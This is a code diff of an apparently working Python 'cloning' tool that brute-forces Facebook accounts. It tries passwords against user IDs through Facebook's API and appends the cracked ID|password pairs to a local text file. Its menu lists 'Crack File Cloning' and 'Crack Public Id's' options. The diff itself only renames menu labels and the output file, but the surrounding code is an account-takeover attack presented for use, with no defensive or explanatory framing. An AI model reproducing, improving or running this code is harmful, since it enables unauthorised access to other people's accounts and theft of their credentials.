@@ -423,17 +423,17 @@ class Main:
 			os.system("xdg-open https://www.youtube.com/@Saadat.Technical")
 			time.sleep(2.1)
 			print("")
-			print("\033[1;37m Successful ")
+			print("\033[1;37m Saadat  Cloning ")
 			time.sleep(2.0)
 			os.system("clear")
 		print(logo)
 		print(" \033[1;37m[▪]Select Option")
 		print("\033[0;90m \033[1;33m•••••••••••••••••••••••••••••••••••••••••••••• ")
-		print(" \033[1;39m\033[1;31m(1) \033[1;36mBest Crack File Cloning\033[0;92m   ✓ (Best)")
+		print(" \033[1;39m\033[1;31m(1) \033[1;36mBest Crack File Cloning\033[0;92m")
 		print(" \033[1;39m\033[1;32m(2) \033[1;34mCrack Public Id's")
 		print(" \033[1;39m\033[1;33m(3) \033[1;33mFacebook id for help ")
-		print(" \033[1;39m\033[1;34m(4) \033[1;32mAFG Random Cloning \033[0;92m ✓ (Best)")
-		print(" \033[1;39m\033[1;35m(5) \033[1;37mAFG Cloning \033[0;92m  ✓ (Best) ")
+		print(" \033[1;39m\033[1;34m(4) \033[1;32mAFG Random Cloning \033[0;92m")
+		print(" \033[1;39m\033[1;35m(5) \033[1;37mAFG Cloning \033[0;92m ")
 		print(" \033[1;39m\033[0;91m(E) Exit \n")
 		MAINUL =input(" \033[1;35mChoice : ")
 		if MAINUL in ["1", "01"]:
@@ -878,12 +878,12 @@ class Main:
 				print("\r \033[0;92m[Saadat-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Saadat-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-2023-Saadat-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[Saadat-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-Saadat-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-2023-Saadat-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
